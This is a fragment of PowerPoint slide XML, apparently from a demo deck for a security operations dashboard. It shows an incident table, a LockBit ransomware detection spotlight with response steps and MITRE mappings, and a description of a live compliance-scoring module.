            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="TextBox 75"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4818888" y="4352544"/>
            <a:ext cx="1234440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Brute Force</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="TextBox 76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="4352544"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Resolved</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="TextBox 77"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7150608" y="4352544"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>r.patel</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="TextBox 78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7927848" y="4352544"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>100%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="TextBox 79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8750808" y="4352544"/>
            <a:ext cx="3474720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Resolved in 1.8h (SLA: 4h)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="Rectangle 80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4572000"/>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92608" y="4608576"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>inc-005</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="TextBox 82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="4608576"/>
            <a:ext cx="3063240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exposed S3 Bucket — 2.3GB PII accessed unauth</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="TextBox 83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4087368" y="4608576"/>
            <a:ext cx="640080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Critical</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85" name="TextBox 84"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4818888" y="4608576"/>
            <a:ext cx="1234440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Data Exposure</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="TextBox 85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="4608576"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Resolved</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="TextBox 86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7150608" y="4608576"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>j.smith</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="TextBox 87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7927848" y="4608576"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>100%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="TextBox 88"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8750808" y="4608576"/>
            <a:ext cx="3474720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Resolved in 3.2h (SLA: 4h)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="Rectangle 89"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4828032"/>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92608" y="4864608"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>inc-006</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="TextBox 91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="4864608"/>
            <a:ext cx="3063240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lateral Movement via Compromised Service Account</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="93" name="TextBox 92"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4087368" y="4864608"/>
            <a:ext cx="640080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>High</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="TextBox 93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4818888" y="4864608"/>
            <a:ext cx="1234440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lateral Movement</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="TextBox 94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="4864608"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Escalated</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="TextBox 95"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7150608" y="4864608"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>s.dev</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="TextBox 96"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7927848" y="4864608"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>20%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="TextBox 97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8750808" y="4864608"/>
            <a:ext cx="3474720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Within SLA — 5h remain</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Rectangle 98"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5193792"/>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28600" y="5230368"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  INC-001 SPOTLIGHT — LockBit 3.0 Ransomware Staging on WORKSTATION-042</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="TextBox 100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5458968"/>
            <a:ext cx="1417320" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Detection:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="TextBox 101"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5458968"/>
            <a:ext cx="10241280" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EDR agent on WORKSTATION-042 flagged LockBit 3.0 staging file writes to C:\ProgramData\SystemTasks\ at 05:35 UTC.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="TextBox 102"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5715000"/>
            <a:ext cx="1417320" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Immediate Action:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name="TextBox 103"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5715000"/>
            <a:ext cx="10241280" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Host isolated from network at 05:38 UTC (3 min response). Forensic memory snapshot taken. IR team paged.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="TextBox 104"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5971032"/>
            <a:ext cx="1417320" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Lateral Risk:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106" name="TextBox 105"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5971032"/>
            <a:ext cx="10241280" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>prod-web-01 shows anomalous connections to WORKSTATION-042 on port 445 (SMB) — potential spread via EternalBlue.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="107" name="TextBox 106"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6227064"/>
            <a:ext cx="1417320" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  MITRE Mapping:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108" name="TextBox 107"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="6227064"/>
            <a:ext cx="10241280" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1486 Data Encrypted for Impact · T1055 Process Injection · T1547 Boot Autostart · T1021 Remote Services (SMB).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="109" name="TextBox 108"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6483096"/>
            <a:ext cx="1417320" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Current Priority:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="TextBox 109"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="6483096"/>
            <a:ext cx="10241280" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Memory forensics → identify C2 IP → full AD audit for lateral movement → check for persistence registry keys.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Compliance</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ISO 27001 · SOC 2 Type II · PCI-DSS v4.0 · GDPR — live control scoring with CVE linkage</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Compliance module automatically evaluates GlobalShip Logistics' security posture against major regulatory frameworks. Rather than a static spreadsheet updated quarterly, every control is assessed against live data: if a CRITICAL CVE linked to a control is still open, the control turns red. If an EDR agent is missing from an endpoint, the corresponding malware protection control fails. If a backup restore test passes this week, the backup control turns green. Analysts can add manual evidence, update control status, and annotate with notes. The result is an always-current compliance posture that is audit-ready at any moment — not just at quarter-end. Reports can be exported as PDF with full control evidence tables in one click.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2148840"/>
            <a:ext cx="2834640" cy="1691640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="1016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834640" cy="54864"/>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 y="2258568"/>
            <a:ext cx="2578608" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ISO 27001</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2057400" y="2221992"/>
            <a:ext cx="914400" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
